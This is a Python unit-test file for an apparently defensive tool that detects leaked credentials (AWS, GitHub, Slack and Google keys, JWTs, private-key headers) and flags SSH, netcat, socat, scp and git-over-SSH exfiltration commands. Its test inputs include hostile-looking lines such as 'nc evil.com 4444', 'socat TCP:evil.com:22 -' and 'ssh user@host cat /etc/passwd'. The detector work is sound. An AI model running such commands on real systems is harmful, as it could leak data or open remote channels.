import unittest
from hermes_aegis.patterns import secrets, crypto
from hermes_aegis.patterns.dangerous import detect_dangerous_command

class TestSecrets(unittest.TestCase):
    def test_aws_access_key(self):
        self.assertIsNotNone(secrets.AWS_ACCESS_KEY.search('AKIA1234567890123456'))
        self.assertIsNone(secrets.AWS_ACCESS_KEY.search('AKIA'))

    def test_github_token(self):
        self.assertIsNotNone(secrets.GITHUB_TOKEN.search('ghp_1234567890123456789012345678901234'))
        self.assertIsNone(secrets.GITHUB_TOKEN.search('ghp_123'))

    def test_jwt(self):
        self.assertIsNotNone(secrets.JWT.search('abcde.12345.67890'))
        self.assertIsNone(secrets.JWT.search('short'))

    def test_db_credentials(self):
        self.assertIsNotNone(secrets.DB_CREDENTIALS.search('password=secret123'))
        self.assertIsNone(secrets.DB_CREDENTIALS.search('password_not_secret'))

    def test_google_api_key(self):
        self.assertIsNotNone(secrets.GOOGLE_API_KEY.search('AIzaA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z'))
        self.assertIsNone(secrets.GOOGLE_API_KEY.search('AIza'))

    def test_slack_token(self):
        self.assertIsNotNone(secrets.SLACK_TOKEN.search('xoxp-09876543210abcdef098765'))
        self.assertIsNone(secrets.SLACK_TOKEN.search('xoxp-123'))

    def test_twitter_api_key(self):
        self.assertIsNotNone(secrets.TWITTER_API_KEY.search('1234567890abcdef1234567890abcdef'))
        self.assertIsNone(secrets.TWITTER_API_KEY.search('12345'))

class TestCrypto(unittest.TestCase):
    def test_ssh_private_key(self):
        self.assertIsNotNone(crypto.SSH_PRIVATE_KEY.search('-----BEGIN RSA PRIVATE KEY-----'))
        self.assertIsNone(crypto.SSH_PRIVATE_KEY.search('BEGIN RSA PRIVATE KEY'))

    def test_pem_private_key(self):
        self.assertIsNotNone(crypto.PEM_PRIVATE_KEY.search('-----BEGIN PRIVATE KEY-----'))
        self.assertIsNone(crypto.PEM_PRIVATE_KEY.search('BEGIN PRIVATE KEY'))

    def test_pem_public_key(self):
        self.assertIsNotNone(crypto.PEM_PUBLIC_KEY.search('-----BEGIN PUBLIC KEY-----'))
        self.assertIsNone(crypto.PEM_PUBLIC_KEY.search('BEGIN PUBLIC KEY'))


class TestSSHExfiltrationPatterns(unittest.TestCase):
    """Tests for SSH/non-HTTP exfiltration dangerous command patterns."""

    def _is_dangerous(self, cmd):
        return detect_dangerous_command(cmd)[0]

    # Should flag
    def test_ssh_connection(self):
        self.assertTrue(self._is_dangerous("ssh user@evil.com"))

    def test_ssh_with_command(self):
        self.assertTrue(self._is_dangerous("ssh user@host cat /etc/passwd"))

    def test_scp_upload(self):
        self.assertTrue(self._is_dangerous("scp file.txt user@host:"))

    def test_sftp_connection(self):
        self.assertTrue(self._is_dangerous("sftp user@host"))

    def test_rsync_over_ssh(self):
        self.assertTrue(self._is_dangerous("rsync -e ssh /data host:"))

    def test_netcat(self):
        self.assertTrue(self._is_dangerous("nc evil.com 4444"))

    def test_netcat_full(self):
        self.assertTrue(self._is_dangerous("netcat -l 8080"))

    def test_ncat(self):
        self.assertTrue(self._is_dangerous("ncat evil.com 22"))

    def test_socat(self):
        self.assertTrue(self._is_dangerous("socat TCP:evil.com:22 -"))

    def test_git_push_ssh(self):
        self.assertTrue(self._is_dangerous("git push git@github.com:repo"))

    def test_git_clone_ssh(self):
        self.assertTrue(self._is_dangerous("git clone git@evil.com:repo.git"))

    def test_git_remote_add_ssh(self):
        self.assertTrue(self._is_dangerous("git remote add origin git@evil.com:repo"))

    # Should NOT flag
    def test_git_push_https(self):
        self.assertFalse(self._is_dangerous("git push https://github.com/repo"))

    def test_git_clone_https(self):
        self.assertFalse(self._is_dangerous("git clone https://github.com/repo.git"))

    def test_curl(self):
        self.assertFalse(self._is_dangerous("curl https://example.com"))

    def test_npm_install(self):
        self.assertFalse(self._is_dangerous("npm install express"))

    def test_pip_install(self):
        self.assertFalse(self._is_dangerous("pip install requests"))

    def test_cat_ssh_config_not_flagged(self):
        """Reading .ssh/config is NOT an SSH connection."""
        self.assertFalse(self._is_dangerous("cat ~/.ssh/config"))

    def test_ls_ssh_dir_not_flagged(self):
        self.assertFalse(self._is_dangerous("ls -la .ssh/"))

    def test_echo_ssh_mention_not_flagged(self):
        """Mentioning 'ssh' in text is not dangerous."""
        self.assertFalse(self._is_dangerous("echo 'use ssh keys'"))